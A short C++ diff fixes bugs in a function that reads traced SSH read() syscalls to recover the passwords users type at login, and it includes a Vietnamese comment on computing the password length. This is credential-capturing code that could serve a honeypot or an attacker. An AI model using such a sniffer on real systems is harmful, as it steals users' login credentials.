@@ -209,10 +209,13 @@ void incoming_ssh_log(int pid, string username)
                 flag++;
             if (flag == 2)
                 break;
-            if (curr[i] != '"')
+            if (curr[i] != '"' and flag == 1)
                 data += curr[i];
         }
-
+        if (data == "")
+        {
+            continue;
+        }
         // read(6, "\f\0\0\0\10admin123", 13)      = 13
         //  count là số gạch '\', độ dài pasword sẽ bằng 13-count=len(admin123)
         int len_passwd = atoi(check_len.c_str()) - count;
@@ -220,7 +223,7 @@ void incoming_ssh_log(int pid, string username)
             continue;
         int index = data.length() - 1;
         string passwd = "";
-        while (len_passwd--)
+        while (len_passwd-- and index >= 0)
         {
             passwd += data[index];
             index--;
